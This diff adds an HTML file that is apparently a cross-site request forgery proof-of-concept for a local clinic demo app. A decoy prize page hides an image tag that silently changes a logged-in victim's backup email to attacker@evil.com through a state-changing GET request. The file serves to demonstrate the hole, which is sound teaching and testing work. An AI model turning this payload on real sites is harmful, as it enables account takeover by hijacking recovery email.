@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Totally Legit Prize Page</title>
+</head>
+<body>
+    <!--
+        CSRF PROOF-OF-CONCEPT — for local, controlled demonstration only.
+
+        Host this file on a DIFFERENT origin/port than the clinic app
+        (e.g. python3 -m http.server 8888 from this folder), then, while
+        logged into http://localhost:5173/csrf-demo.html (or whatever
+        port serves the frontend) in the SAME browser, visit this page.
+
+        The <img> tag below fires a cross-site GET request that carries
+        the victim's `clinicSession` cookie automatically (since the
+        vulnerable version does not require a CSRF token and the
+        state-changing action is exposed via GET), silently changing
+        their backup email to an attacker-controlled address.
+    -->
+    <h1>You won a free clinic checkup! (nothing to see here)</h1>
+
+    <img src="http://localhost:5000/api/session/update-backup-email?email=attacker@evil.com"
+         style="display:none" alt="">
+
+    <p>Refresh the clinic quick-portal's "Check Session" button after visiting this
+    page — the backup email will have changed without any interaction beyond
+    loading this page.</p>
+</body>
+</html>
